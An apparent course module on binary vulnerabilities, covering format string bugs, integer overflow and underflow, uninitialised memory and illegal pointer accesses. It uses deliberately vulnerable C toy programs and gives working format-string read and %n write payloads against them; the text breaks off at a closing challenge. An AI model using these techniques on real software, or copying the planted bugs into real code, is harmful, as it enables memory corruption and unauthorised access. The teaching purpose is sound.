Session 4 - Intro to Vulns
==========================

In this session, we will take a broad look at the common classes of
vulnerabilities present in binary based executables. These include memory
corruption bugs, unintended use of library functions, and arbitrary precision
limitations. We will cover Format String Vulnerabilities, Integer Overflows and
Underflows, Uninitialised Memory, Illegal Memory Accesses, Overflow-Based
Vulnerabilities, and Faulty Memory Management.

Objectives
----------

1. Format String Vulnerabilities
2. Integer Overflows and Underflows
3. Memory Corruption Vulnerabilities
    1. Uninitialised Memory
    2. Out-of-Bounds Memory Accesses
    3. Overflow-Based (We will cover this next session)
    4. Faulty Memory Management (We will cover this next session)


1. Format String Vulnerabilities
--------------------------------

Format string vulnerabilities occur when applications misuse the `printf()`
family of functions. The following code is vulnerable ([basic1.c][1]):

```c
#include <stdio.h>

int main(int argc, char** argv) {
        printf(argv[1]);
}
```

To be specific, the crux of the problem lies where untrusted and arbitrary user
input is used as the format string in the `printf()` function. A format string
contains special format specifiers that get replaced by the values specified in
the subsequent arguments during runtime. If an attacker can control the format
string, he gains the ability to read and write to arbitrary locations in memory.

### How Format String Functions Actually Work

A typical use of the format string might look like this ([basic2.c][2]):

```c
#include <stdio.h>

int main(int argc, char** argv) {
        printf("Hi, my name is %s. I am %d years old.\n", "Morty", 14);
}
```

The execution of this program:

```console
$ ./basic2
Hi, my name is Morty. I am 14 years old.
```

Let's look at what's happening under the hood:

```console
gdb-peda$ x/4xw $esp
0xffff0000: 0x08048440  0x080484d8  0x080484d0  0x0000000e
gdb-peda$ x/s 0x080484d8
0x80484d8:  "Hi, my name is %s. I am %d years old.\n"
gdb-peda$ x/s 0x080484d0
0x80484d0:  "Morty"
gdb-peda$ p/d 0x0000000e
$3 = 14
```

The stack looks like this:

![basic 2 stack][basic2stack]

Observe that the first format specifier "%s" corresponds to the "Morty" and "%d"
corresponds to 0xe which is 14 in decimal. The `printf()` function scans the
format string at runtime for format specifiers and formats the corresponding
argument on the stack. Now, what happens if a format string has more specifiers
than arguments? Take a look at the following code ([basic3.c][2]):

```c
#include <stdio.h>

int main(int argc, char** argv) {
    meeseeks();
}

void meeseeks() {
    int wish1 = 0x41414141;
    int wish2 = 0x42424242;
    int wish3 = 0x43434343;
    int wish4 = 0x44444444;
    printf("I'm Mr Meeseeks! Look at me! Your wishes: %x, %x, %x, %x, %x, %x, %x\n");
}
```

Let's run the program:

```console
$ ./basic3
I'm Mr Meeseeks! Look at me! Your wishes: f772b000, fff55f64, c5da, 41414141,
42424242, 43434343, 44444444
```

Notice that variables from the `meeseeks()` stack frame is accessed by the
`printf()` function along with some garbage. The garbage is unused data from
when space is allocated before the function call. Here is the disassembly:

```console
0804843f <meeseeks>:
 804843f:       55                      push   %ebp
 8048440:       89 e5                   mov    %esp,%ebp
 8048442:       83 ec 18                sub    $0x18,%esp
 8048445:       c7 45 e8 41 41 41 41    movl   $0x41414141,-0x18(%ebp)
 804844c:       c7 45 ec 42 42 42 42    movl   $0x42424242,-0x14(%ebp)
 8048453:       c7 45 f0 43 43 43 43    movl   $0x43434343,-0x10(%ebp)
 804845a:       c7 45 f4 44 44 44 44    movl   $0x44444444,-0xc(%ebp)
 8048461:       83 ec 0c                sub    $0xc,%esp
 8048464:       68 00 85 04 08          push   $0x8048500
 8048469:       e8 82 fe ff ff          call   80482f0 <printf@plt>
```

Notice 0xc amount of space is allocated which corresponds to the 12 bytes
printed by the program before the previous stack frame's variables. Now, if we
want to visualise the stack, it should look like this:

![basic 3 stack][basic3stack]

Now, let's revisit the vulnerable code at the [beginning][1] of this section. We
can see that the intention of the code is to echo whatever the user provides as
an argument to the program.

```console
$ ./basic1 buurrrp
buurrrp
$ ./basic1 yeaars
yeaars
```

What the programmer had forgotten, however, is that format specifiers exist and
an attacker can craft special input to disclose data on the stack:

```console
$ ./basic1 "%x %x %x %x %x"
bb251528 bb251540 0 ba26edd0 ba2839d0
```

### Cheap Format String Tricks

Now, let's introduce some rough techniques to dump memory. To make it easier, we
will introduce a feature of the format specifier called the 'direct parameter
access'. The 'direct parameter access' lets you access a particular parameter
out of order by specifying an index in the specifier. For example, `%10$x` takes
the 10th parameter for formatting.

To demonstrate, let's use this sample code ([basic4.c][4]):

```c
$ cat basic4.c
#include <stdio.h>

int main(int argc, char** argv) {
    meeseeks();
}

void meeseeks() {
    int wish1 = 0x41414141;
    int wish2 = 0x42424242;
    int wish3 = 0x43434343;
    int wish4 = 0x44444444;
    printf("Last golf run: %3$x\n", wish1, wish2, wish3, wish4);
}
```

In the code, we directly access the third parameter, `wish3`, for printing. We
should expect that `wish3` (0x43434343) would be printed when we run the
program:

```
$ ./basic4
Last golf run: 43434343
```

Now that we know about 'direct parameter access', we can use this to do some
cheap scripting on our vulnerable code ([basic1.c][1]):

```console
$ for i in `seq 1 100`; do ./basic1 "%$i\$x"; echo;done
152a7578
a2860520
0
17e6dd0
d0d689d0
...
3fc42bb9
67b0cbd7
c9042bec
e606ac38
d799ec52
75dbec66
75c1dc79
6fd43c8a
cd7bcc99
...
```

Now, if you look closely, there are pointers in memory from the dump. We can
read from those locations in memory by using `%s`, which prints a string by
deferencing a char pointer.

```console
$ for i in `seq 1 100`; do ./basic1 "%$i\$s"; echo;done
(null)
...
Segmentation fault (core dumped)
...
./basic1
%38$s
(null)
XDG_VTNR=7
LC_PAPER=en_SG.UTF-8
LC_ADDRESS=en_SG.UTF-8
XDG_SESSION_ID=c2
XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/amon
LC_MONETARY=en_SG.UTF-8
...
```

As it starts dereferencing pointers, you get Segmentation Faults because these
pointers might point to areas of memory that are illegal to access. For example,
if it tries to dereference the memory address `0x41414141` it will segfault.
What is interesting here is that we are able to dump environment variables from
the heap. This might be useful for an attacker trying to gain information on the
operating environment of the application.

### Surgical Format String Exploitation

Broad information leaks are fun and all, but we can do better. Format string
vulnerabilities not only give the ability to read up the stack, but the
ability to arbitrarily write to and read from any location in memory.

#### Arbitrary Read Primitive

Let's take a look at how we can construct an arbitrary read primitive in this
example ([basic5.c][5]):

```c
#include <stdio.h>

char token[26];

int main() {
    strncpy(token, "yum-yum-squanch-squaunchy", 26);
    printf("Token address: 0x%x\n", &token);
    squanch();
}

void squanch() {
    fputs("Please give me something to squanch: ", stdout);
    char squeak[501] = {0};
    scanf("%500s", squeak);
    printf(squeak);
}
```

What this program does is print the address of the `token` then take input from
the user which is directly used in the `printf()` function. Our objective is to
get the token to be printed using the format string vulnerability. Here is an
innocent sample run:

```console
$ ./basic5
Token address: 0x804a034
Please give me something to squanch: Wubababadubdub!
Wubababadubdub!
```

And here's the detection of the vulnerability:

```console
$ ./basic5
Token address: 0x804a034
Please give me something to squanch: %x.%x.%x.%x.%x
ffa52867.25.f76e7e80.f77169e9.25731000
```

Now, let's make one more observation. We place a discernable marker in the input
and dump the stack.

```console
$ ./basic5
Token address: 0x804a034
Please give me something to squanch: AAAA%x.%x.%x.%x.%x.%x.%x.%x.
AAAAff925d27.25.f76f2e80.f77219e9.4173c000.25414141.78252e78.2e78252e.
```

Notice that 0x41414141 is present in this bit:
`4173c000.25414141.78252e78.2e78252e.`. Let's decode that bit:

```console
In [1]: "4173c000.25414141.78252e78.2e78252e".replace(".", "").decode("hex")
Out[1]: 'As\xc0\x00%AAAx%.x.x%.'
```

It's a little tough to read but we can see the start of the input we supplied.
Let's adjust the input so that the AAAA is nicely aligned.

```console
$ ./basic5
Token address: 0x804a034
Please give me something to squanch: XAAAA%x.%x.%x.%x.%x.%x.%x.%x.
XAAAAff9214e7.25.f7733e80.f77629e9.5877d000.41414141.252e7825.78252e78.
```

Now we have a way to supply an arbirary value on the stack for use in our
exploit. Let's clean it up further with direct parameter access.

```console
$ ./basic5
Token address: 0x804a034
Please give me something to squanch: XAAAA%6$x
XAAAA41414141
```

Recall that we can use `%s` to dereference a pointer on the stack and print the
contents at that address. We just need to supply the address of the `token` and
use `%s` to trigger that read. We will use `0x804a034` as given by the program.
The address does not shift between executions as the variable is global.

```console
$ python -c 'import struct; print "X" + struct.pack("I", 0x804a034) + "%6$s"' | ./basic5
Token address: 0x804a034
Please give me something to squanch: X4�yum-yum-squanch-squaunchy
```

The string "yum-yum-squanch-squaunchy" is printed after some junk characters.
The junk characters come from the address we had provided to read from.

#### Arbitrary Write Primitive

Before we begin, we have to introduce another format specifier. The `%n`
specifier writes the number of characters written so far to the address
supplied. Here is an example of the specifier in action ([basic6.c][6]):

```c
$ cat basic6.c
#include <stdio.h>

int main() {
    int count = 0;
    printf("Show me what you got!%n\n", &count);
    printf("Number of characters written: %d\n", count);
}
```

Here is the run of the program:

```console
$ ./basic6
Show me what you got!
Number of characters written: 21
```

This lets us write values to anywhere we want since we have demonstrated that we
can supply a pointer to be dereferenced in the previous section.

For this demonstration, we will use this sample program ([basic7.c][7]).

```c
#include <stdio.h>

int security_code;

int main() {
    security_code = 0;
    printf("Security code address: 0x%x\n", &security_code);
    go_customs();
    printf("\nSecurity code: %x\n", security_code);
    if (check_code()) {
        puts("That isn't right... go to jail!");
    }
    else {
        puts("All clear!");
    }
}

int check_code() {
    if (security_code == 42) {
        return 0;
    }
    return 1;
}

void go_customs() {
    fputs("Passport number: ", stdout);
    char passport[501] = {0};
    scanf("%500s", passport);
    printf(passport);
}
```

This program checks if the security code is equals to 42. If it is, it lets
you through customs. It takes a 'passport number' but doesn't do anything to
modify the value of the security code from the initial value of 0 so there is no
legitimate way of setting it to 42. Let's take a look at a sample run:

```console
$ ./basic7
Security code address: 0x804a038
Passport number: 123456
123456
Security code: 0
That isn't right... go to jail!
```

Now, let's detect the vulnerability:

```console
$ ./basic7
Security code address: 0x804a038
Passport number: AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.
AAAAffcb29b7.11.f76c4e80.f76f39e9.4170e000.25414141.78252e78.2e78252e.252e7825.
Security code: 0
That isn't right... go to jail!
```

Let's try and write to the security code address:

```console
$ python -c 'import struct; print "X"+struct.pack("I", 0x804a038)+"%6$n"' |
./basic7
Security code address: 0x804a038
Passport number: X8�
Security code: 5
That isn't right... go to jail!
```

Notice that the value of `security_code` actually changed. This is because we
had 1 byte printed from the "X" to align the bytes in memory and 4 from the
address we supplied. Now, we can increase that number by making the format
string print more characters. We can do that with greater precision by using a
width in the format specifier. We shall add a `%100x` to increase the number of
characters printed.

```console
$ python -c 'import struct; print "X"+struct.pack("I", 0x804a038)+"%100x%6$n"' | ./basic7
Security code address: 0x804a038
Passport number: X8�                                                                                            ffa2b7f7
Security code: 105
That isn't right... go to jail!
```

Exactly 100 extra characters has been printed and exactly 100 has been added to
the `security_code`. Therefore, we can force it to be 42 by performing the
calculation: 42 - 5 = 37 and bypass the check!

```console
$ python -c 'import struct; print "X"+struct.pack("I", 0x804a038)+"%37x%6$n"' | ./basic7
Security code address: 0x804a038
Passport number: X8�                             ffb9f8f7
Security code: 42
All clear!
```

2. Integer Overflows and Underflows
-----------------------------------

Integer overflows and underflows happen when arthmetic operations that result in
too large values are stored in data types that do not have enough space to store
the entirety of the value. Let's take a look at the following code as an
example:

```c
#include <stdio.h>

int main() {
    unsigned char gem = 50;
    printf("Gem = %d\n", gem);
    gem = gem + 206;
    printf("New Gem = %d\n", gem);
}
```

Now, if we expect math to work as it should, we should get `206 + 50 = 256`
after the addition operation. Let's see if that is what happens when we run the
program ([over1.c][8]):

```console
$ ./over1
Gem = 50
New Gem = 0
```

An odd thing happened (if you didn't know about integer overflows). We expected
for the new gem to have the value 256, but it contains 0 instead. Why exactly
does this happen though? If we look at the size of an `unsigned char`, it is an
unsigned data type that occupies 1 byte in memory. 1 byte is 8 bits. Since it is
unsigned, all the bits go towards storing the value. The maximum value 8 bits
can represent is 0b11111111 (255). Let's investigate:

```console
In [1]: 0b11111111
Out[1]: 255

In [2]: 255 + 1
Out[2]: 256

In [3]: bin(256)
Out[3]: '0b100000000'
```

Now, when we add 1 to the largest number that can be represented with 8 bits, we
get a number that can only be represented with 9 bits. So, how can we resolve
this? We simply truncate the value to 8 bits and store the result.

```console
In [4]: bin(256 & 0b11111111)
Out[4]: '0b00000000'

In [5]: 256 & 0b11111111
Out[5]: 0
```

This explains why the value of the new gem is 0. Now, this applies to other data
types as well such as `int` (which is typically 4 bytes in a 32 bit system).
Underflows work similarly. Let's take a look at the next example
([under2.c][9]):

```c
#include <stdio.h>

int main() {
    unsigned char guys = 3;
    int i;
    printf("Onion is trying to steal my G.U.Y.s!\n");
    printf("I have %d now.\n", guys);
    for (i = 0; i < 5; i++) {
        steal_guy(&guys);
        printf("Oh no, Onion stole one! I have %d left!\n", guys);
    }
    printf("What! I have more G.U.Y.s than I started with!\n");
}

void steal_guy(unsigned char* guy) {
    *guy = *guy - 1;
}
```

Let's see what happens when we run the program:

```console
$ ./under2
Onion is trying to steal my G.U.Y.s!
I have 3 now.
Oh no, Onion stole one! I have 2 left!
Oh no, Onion stole one! I have 1 left!
Oh no, Onion stole one! I have 0 left!
Oh no, Onion stole one! I have 255 left!
Oh no, Onion stole one! I have 254 left!
What! I have more G.U.Y.s than I started with!
```

Now we can see that in addition to overflows, we also have underflows where once
a number gets too small to be represented, it loops to become the largest
number. This is the equivalent of doing the mod operation. In the above example
the operation done is `(3-5) % 256 = 254`.

Next, let see what happens when we throw signed numbers into the mix. Now, let's
make the observation that `unsigned char` has the range `0-255` with a total
number of 256 possible values. Now, an `unsigned char` has the range `-128-127`.
We won't go into detail on why number representations but here's an example to
demonstrate that we can make large numbers negative with integer overflows.
([over3.c][10])

```c
#include <stdio.h>

int main() {
    signed char zombies = 123;
    int i;
    printf("Pearl: \"There are too many of them! %d to be exact!\"\n", zombies);
    puts("Steven: \"I have an idea! Instead of killing them, let's make more!\"");
    puts("Amethyst: \"Wait, what? You're nuts!\"");
    for (i = 0; i < 7; i++) {
        make_zombies(&zombies);
        printf("Random Stranger: \"Ouch, I got bit! Grrgh ugh %d zombies.\n",
                zombies);
    }
    printf("Steven: \"See, there are %d zombies now! And the opposite of " \
            "zombies are cute cats! Yay cute cats! :3\"\n", zombies);
}

void make_zombies(signed char* zombies) {
    *zombies = *zombies + 1;
}
```

Will Steven's plan work? Let's find out:

```console
$ ./over3
Pearl: "There are too many of them! 123 to be exact!"
Steven: "I have an idea! Instead of killing them, let's make more!"
Amethyst: "Wait, what? You're nuts!"
Random Stranger: "Ouch, I got bit! Grrgh ugh 124 zombies.
Random Stranger: "Ouch, I got bit! Grrgh ugh 125 zombies.
Random Stranger: "Ouch, I got bit! Grrgh ugh 126 zombies.
Random Stranger: "Ouch, I got bit! Grrgh ugh 127 zombies.
Random Stranger: "Ouch, I got bit! Grrgh ugh -128 zombies.
Random Stranger: "Ouch, I got bit! Grrgh ugh -127 zombies.
Random Stranger: "Ouch, I got bit! Grrgh ugh -126 zombies.
Steven: "See, there are -126 zombies now! And the opposite of zombies are cute cats! Yay cute cats! :3"
```

While it might seem super weird that Steven's plan to get rid of zombies is to
make more of them, it works in the computer world. This is because the largest
value for a `signed char` is 127 and when there's not enough space to hold a
larger number, it wraps around to the smallest number. Thus, the zombies are
turned into cute cats.

### How Is This Exploitable

Integer overflows and underflows are not immediately exploitable. One would
usually have to explore a context a little deeper to discover the side effects
the odd behaviour would induce. A traditional example is the unbeatable gambling
game scenario where to get a flag, you have to get an unsurmountable amount of
money from beating the server. However, this is intentionally made impossible.

Here's something that might pass for a class project ([gambling4.c][11]):

```c
#include <time.h>
#include <stdlib.h>
#include <stdio.h>

int main() {
    srand(time(NULL));
    unsigned int money = 40;
    int i;
    printf("Welcome to the Tiger Millionaire Casino!\n");
    printf("Since this is your first time, we'll give you a free $50!\n");
    for (i = 0; i < 5; i++) {
        play(&money);
        printf("You have $%u. Checking if you have enough...\n", money);
        check(&money);
    }
    printf("I'm sorry, you're out of tries. You lose!\n");
}

void play(unsigned int *money) {
    int bet = 0;
    printf("Place your bets: ");
    scanf("%d", &bet);
    if (bet > 10 || bet < 0) {
        printf("Sorry, you can only bet between 0 and 10\n");
        return;
    }
    int toguess = rand();
    int guess = 0;
    printf("Make the guess: ");
    scanf("%d", &guess);
    if (guess == toguess) {
        printf("You got it right!\n");
        *money = *money + bet;
    }
    else {
        printf("You got it wrong!\n");
        *money = *money - bet;
    }
    printf("The answer was: %d.\n", toguess);
}

void check(unsigned int *money) {
    if (*money > 5000) {
        printf("You win!\n");
        exit(0);
    }
}
```

It's a simple guessing game that awards money if you make a correct guess, and
subtracts money if you make an incorrect guess. Here's a sample run:

```console
$ ./gambling4
Welcome to the Tiger Millionaire Casino!
Since this is your first time, we'll give you a free $50!
Place your bets: 1
Make the guess: 10
You got it wrong!
The answer was: 73409706.
You have $39. Checking if you have enough...
Place your bets: 1
Make the guess: 10
You got it wrong!
The answer was: 133354826.
You have $38. Checking if you have enough...
Place your bets: 1
Make the guess: 10
You got it wrong!
The answer was: 545133448.
You have $37. Checking if you have enough...
Place your bets: 1
Make the guess: 10
You got it wrong!
The answer was: 1154205733.
You have $36. Checking if you have enough...
Place your bets: 1
Make the guess: 10
You got it wrong!
The answer was: 1459247752.
You have $35. Checking if you have enough...
I'm sorry, you're out of tries. You lose!
```

Now, if you realise, even if you get all 6 tries correct, that is a profit of
only $60 dollars. That is hardly enough to win. You need more than $5000 to win.
However, that isn't a problem now that we know about integer underflows. Let's
just try to make our money wrap around so we'll end up with a lot of money!

```console
$ ./gambling4
Welcome to the Tiger Millionaire Casino!
Since this is your first time, we'll give you a free $50!
Place your bets: 10
Make the guess: 1
You got it wrong!
The answer was: 61613877.
You have $30. Checking if you have enough...
Place your bets: 10
Make the guess: 1
You got it wrong!
The answer was: 899092899.
You have $20. Checking if you have enough...
Place your bets: 10
Make the guess: 1
You got it wrong!
The answer was: 1406725995.
You have $10. Checking if you have enough...
Place your bets: 10
Make the guess: 1
You got it wrong!
The answer was: 1895919108.
You have $0. Checking if you have enough...
Place your bets: 10
Make the guess: 1
You got it wrong!
The answer was: 1657019656.
You have $4294967286. Checking if you have enough...
You win!
```

Non-contrived examples exist in the wild: integer overflows and underflows
induce unexpected behaviours in applications and are rather subtle to detect.
For example, [CVE-2015-8370][12] is a Grub2 Authentication Bypass discovered by
Hector Marco and Ismael Ripoll that has an integer underflow at it's base. It
allows an attacker to bypass any Grub authentication by simply pressing the
backspace key 28 times.

It's a pretty cool discovery so check the link to read the details.


3. Memory Corruption Vulnerabilities
------------------------------------

Memory corruption vulnerabilities are the bread and butter of much of systems
security research. We will classify them in four broad categories:

1. Uninitialised Memory
2. Use of None-Owned Memory
3. Overflow-Based
4. Faulty Memory Management

### Uninitialised Memory

Uninitialised memory vulnerabilities are extremely subtle. When a program uses
data before it is initialised, unexpected behaviour can occur depending on the
context. For example, let's take a look at this ([uninit1.c][13]):

```c
#include <stdio.h>

int main() {
    eat_burrito();
    everything_burrito();
    eat_burrito();
}

void everything_burrito() {
    char everything[500];
    memset(everything, 0x41, 500);
}

void eat_burrito() {
    char burrito[500];
    puts("Never know what you're gonna get!");
    printf("Yum: %x %x %x %x %x\n", burrito[200], burrito[201], burrito[202],
            burrito[203], burrito[204]);
}
```

In the `eat_burrito()` function, the `burrito` variable is accessed without any
initialisation done on the string array. It is called two times. Let's see what
happens when we run it a couple of times:

```console
$ ./uninit1
Never know what you're gonna get!
Yum: 58 8 77 fffffff7 64
Never know what you're gonna get!
Yum: 41 41 41 41 41
$ ./uninit1
Never know what you're gonna get!
Yum: 58 ffffffe8 72 fffffff7 44
Never know what you're gonna get!
Yum: 41 41 41 41 41
$ ./uninit1
Never know what you're gonna get!
Yum: 58 ffffffa8 76 fffffff7 fffffff4
Never know what you're gonna get!
Yum: 41 41 41 41 41
```

Notice that on the first invocation of `eat_burrito()` for each of the runs, the
values seem to be rather random. This is due to the ASLR randomising the
pointers. On the second invocation of `eat_burrito()`, the values are the same
all the time even though there was no initialisation done on the `burrito`
variable in the `eat_burrito()` function.

To make this clearer, let's take a look at what happens to the stack before and
after the `everything_burrito()` function is called.

Before, there is random data in the `burrito` variable.

![uninit1 before][uninit1before]

During the `everything_burrito()` invocation, `memset` is called to set all
memory addresses to a particular value, in this case `0x41` is chosen.

![uninit1 during][uninit1during]

On the second call to `eat_burrito()`, no data initialisation occurs so the
values on the stack from the `everything_burrito()` call remains.

![uninit1 after][uninit1after]

#### Is this... exploitable?

Certainly, this gives rise to very subtle bugs but there has been
vulnerabilities discovered in Internet Explorer 6-8 that allowed attackers to
execute arbitrary code by [leveraging an uninitialised memory bug][14]. However,
let us try and imagine a situation where this might appear in an (slightly
contrived) example ([uninit2.c][15]).

```c
#include <stdio.h>

struct Adventurer {
    char name[40];
    int level;
};

struct Adventurer finn;

int main() {
    finn.level = 0;
    strncpy(finn.name, "Finn", 5);
    printf("%s is an adventurer! He is level %u!\n", finn.name, finn.level);
    printf("Finn lives at 0x%x (it's a treehouse.)\n", &finn);
    puts("He needs training but only Billy *guitar solo* can train him.");
    printf("Can you tell us where he is? ");
    billyspad();
    findbilly();
    checkfinn();
}


void billyspad() {
    char everything[500];
    memset(everything, 0, 500);
    scanf("%499s", everything);
}

void findbilly() {
    char search[500];
    puts("Thanks! But we couldn't find Billy at: ");
    printf(search);
}

void checkfinn() {
    puts("\nNever mind though! If he is level 101, he will become super" \
            "mathematical and awesome!");
    printf("Level: %u\n", finn.level);
    if (finn.level != 101) {
        printf("Aww cabbage... %s isn't level 101!\n", finn.name);
    }
    else {
        puts("Woooo, he is totally RAD!");
    }
}
```

There are two vulnerabilities in this snippet of code: an uninitialised memory
bug and a format string bug. We need to use both of them in conjunction to show
that Finn is totally rad. First, let's try running it normally:

```console
$ ./uninit2
Finn is an adventurer! He is level 0!
Finn lives at 0x804a060 (it's a treehouse.)
He needs training but only Billy *guitar solo* can train him.
Can you tell us where he is? Maybe, the Candy Kingdom?
Thanks! But we couldn't find Billy at:
Maybe,
Never mind though! If he is level 101, he will become supermathematical and awesome!
Level: 0
Aww cabbage... Finn isn't level 101!
```

And verifying that the we can control the format string bug.

```console
$ ./uninit2
Finn is an adventurer! He is level 0!
Finn lives at 0x804a060 (it's a treehouse.)
He needs training but only Billy *guitar solo* can train him.
Can you tell us where he is? %x.%x.%x
Thanks! But we couldn't find Billy at:
ffd92e68.1f4.f773db18
Never mind though! If he is level 101, he will become supermathematical and awesome!
Level: 0
Aww cabbage... Finn isn't level 101!
```

Now the bugs occurs in `findbilly()`. The variable `search` is not initialised
but `printf()` is called with that as a variable. `search` is controllable by
the attacker because a previous function call filled that area with an input
prompt. Now, all we have left to do is to overwrite the structure with the
format string attack.

```console
$ python -c 'import struct;print struct.pack("I", 0x804a060) + "%97x%6$n"' | ./uninit2
Finn is an adventurer! He is level 0!
Finn lives at 0x804a060 (it's a treehouse.)
He needs training but only Billy *guitar solo* can train him.
Can you tell us where he is? Thanks! But we couldn't find Billy at:
`�                                                                                         ffc6c868
Never mind though! If he is level 101, he will become supermathematical and awesome!
Level: 0
Aww cabbage... e isn't level 101!
```

But wait, the level did not increase. We need to remember something though, we
are overwriting a structure. The first member of the structure happens to be the
name of the adventurer and if you look closely, the name of the adventurer
changed from 'Finn' to 'e'. All we have to do is do a little arithmetic to the
memory address given to get the right offset and overwrite the level member of
the structure..

```console
$ python -c 'import struct;print struct.pack("I", 0x804a060+40) + "%97x%6$n"' | ./uninit2
Finn is an adventurer! He is level 0!
Finn lives at 0x804a060 (it's a treehouse.)
He needs training but only Billy *guitar solo* can train him.
Can you tell us where he is? Thanks! But we couldn't find Billy at:
��                                                                                         ff813b48
Never mind though! If he is level 101, he will become supermathematical and awesome!
Level: 101
Woooo, he is totally RAD!
```

### Illegal Memory Accesses

We will define illegal memory accesses in three ways:

1. Null Pointers
2. Out-of-Bounds Memory Pointers
3. Dangling Pointers

The common theme between the three is that the pointers are none-owned, that is,
the pointers point to no man's land in memory. At the very least, the
exploitation of these vulnerabilities will result in a denial-of-service
condition. There is the potential for code execution or privilege escalation in
certain cases.

#### Null Pointers

Null pointers are straightforward. The bug happens when the pointer is
dereferenced. Usually this causes the program to crash but it is possible to
turn this into a [local privilege escalation][16] exploit. Let's take a look at
a trivial [example][17]:

```c
#include <stdio.h>

int main() {
    int *ptr = 0;
    printf("Pointer: 0x%x\n", ptr);
    printf("Pointer Value: 0x%x\n", *ptr);
    return 0;
}
```

If we run this, we will get a segmentation fault since the null dereference will
cause the kernel raise a page fault error:

```console
$ ./null1
Pointer: 0x0
Segmentation fault (core dumped)
```

#### Out-of-Bounds Memory Accesses

The null pointer dereference is a subset of this category. Typically, in an
out-of-bounds memory access, the program attempts to dereference areas of memory
that are not mapped. Here is an [example][18]:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char *array = "AAAA";
    printf("Array Address: 0x%x\n", array);
    printf("Array Contents: %s\n", array);
    strcpy(&array, array);
    printf("New Array Address: 0x%x\n", array);
    printf("New Array Contents: %s\n", array);
    return 0;
}
```

In the example, we print a string buffer normally, then we overwrite the string
pointer with the string itself causing a dereference from `0x41414141` (AAAA).
This should cause a crash since `0x41414141` is not mapped in memory.

```console
$ ./outofbounds1
Array Address: 0x80485c0
Array Contents: AAAA
New Array Address: 0x41414141
Segmentation fault (core dumped)
```

If we check what is mapped in memory, we can see that `0x41414141` is not in any
of the ranges:

```console
gdb-peda$ vmmap
Start      End        Perm      Name
0x08048000 0x08049000 r-xp      /nightsoferised/sessions/session4/illeagle/outofbounds1
0x08049000 0x0804a000 r--p      /nightsoferised/sessions/session4/illeagle/outofbounds1
0x0804a000 0x0804b000 rw-p      /nightsoferised/sessions/session4/illeagle/outofbounds1
0xf7dfa000 0xf7dfb000 rw-p      mapped
0xf7dfb000 0xf7faf000 r-xp      /lib/i386-linux-gnu/libc-2.21.so
0xf7faf000 0xf7fb2000 r--p      /lib/i386-linux-gnu/libc-2.21.so
0xf7fb2000 0xf7fb4000 rw-p      /lib/i386-linux-gnu/libc-2.21.so
0xf7fb4000 0xf7fb6000 rw-p      mapped
0xf7fd4000 0xf7fd7000 rw-p      mapped
0xf7fd7000 0xf7fd9000 r--p      [vvar]
0xf7fd9000 0xf7fda000 r-xp      [vdso]
0xf7fda000 0xf7ffc000 r-xp      /lib/i386-linux-gnu/ld-2.21.so
0xf7ffc000 0xf7ffd000 r--p      /lib/i386-linux-gnu/ld-2.21.so
0xf7ffd000 0xf7ffe000 rw-p      /lib/i386-linux-gnu/ld-2.21.so
0xfffdd000 0xffffe000 rw-p      [stack]
```

#### Dangling Pointers

Dangling pointers are pointers that point to data which are no longer valid.
This can happen when a pointer points to an object that falls out of scope (this
can happen with local variables in functions) or when a pointer points to freed
regions of memory (we will talk more about this in the next section: Faulty
Memory Management).

Now, let's take a look at what happens when pointers use an object that falls
out of scope. Have a look at this [example][19]:

```c
#include <stdlib.h>
#include <stdio.h>

void assign(int **pointy) {
    int workers[100] = {0};
    int the_boss = 0x41414141;
    *pointy = &the_boss;
}

void slackoff(int dowork) {
    int boredom[100] =  {0};
    int slack = 0xdeadbeef;
    printf("0x%x sounds boring. Ignore!\n", dowork);
    printf("I will slack off for 0x%x seconds!\n", slack);
}

int main() {
    int *ptr;
    assign(&ptr);
    printf("Pointer: address 0x%x and value 0x%x\n", ptr, *ptr);
    slackoff(0xcafebabe);
    printf("Slack Pointer: address 0x%x and value 0x%x\n", ptr, *ptr);
    return 0;
}
```

It can get a little confusing but what happens here is that the pointer `ptr`
gets pointed to a region of memory allocated on the stack during `assign()` and
then the address that the pointer is pointing to gets printed along with the
value of that address. Normally, we would expect the pointer not to change since
nothing is done to it in the `slackoff()` function. However, this is shown not
to be the case when we run the example:

```console
$ ./dangling1
Pointer: address 0xff7fed08 and value 0x41414141
0xcafebabe sounds boring. Ignore!
I will slack off for 0xdeadbeef seconds!
Slack Pointer: address 0xff7fed08 and value 0xdeadbeef
```

If you notice, the first time the pointer gets dumped, it seems like the region
of memory allocated in `assign()` is still intact, with the value `0x41414141`
printed as expected. This is misleading however, since we have dropped out of
that function's scope. Now, when we call `slackoff()`, a new stack space is
set up with the new scope and values are overwritten. Hence, we now see that the
pointer contains the same address but a different value.

If this is a little confusing, just imagine this is what pointers look like
immediately after the `assign()` call:

![during assign][dangling1assign]

And after the `slackoff()` call:

![during slackoff][dangling1slack]

In addition to dangling pointers caused by falling out of scope, dangling
pointers can also arise from using freed memory (this we will go into detail in
the Faulty Memory Management segment next session). However, we will give you a
little taste as to how the vulnerability looks like in this [example][20]:

```c
#include <stdlib.h>

int main() {
    char *ptr = malloc(50);
    memset(ptr, 0x41, 50);
    ptr[99] = 0;
    printf("Contents of ptr: %s\n", ptr);
    free(ptr);
    printf("We freed ptr\n");

    printf("Doing some completely unrelated thing.\n");
    char *unrelated = malloc(50);
    memset(unrelated, 0x42, 50);
    unrelated[99] = 0;

    printf("Contents of ptr: %s\n", ptr);
    return 0;
}
```

In the example, we allocate 50 bytes of memory with `malloc` and store the
address in `ptr`. We fill the buffer with "A"s (0x41) and print it. Next, we
free the memory pointed to by the pointer for other use. Then, we allocate
another 50 bytes with `malloc` and fill the buffer with "B"s (0x42). We then
print from the memory address pointed to by the pointer `ptr` again. It is
uncertain what should happen since it had been freed.

Let's run the program to see what happens:

```console
$ ./dangling2
Contents of ptr: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
We freed ptr
Doing some completely unrelated thing.
Contents of ptr: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

Now, it seems like the unrelated thing we did affected the freed region of
memory. That's pretty interesting.

4. Closing Challenge
--------------------

To conclude this session, let's try a little [challenge][21]:

```c
#include <stdio.h>
#include <stdlib.h>

struct streamer {
    char name[40];
    char cmd[10];
};

int main() {
    struct streamer *helena = (struct streamer*) malloc(sizeof(struct streamer));
    strcpy(helena->name, "Helena");
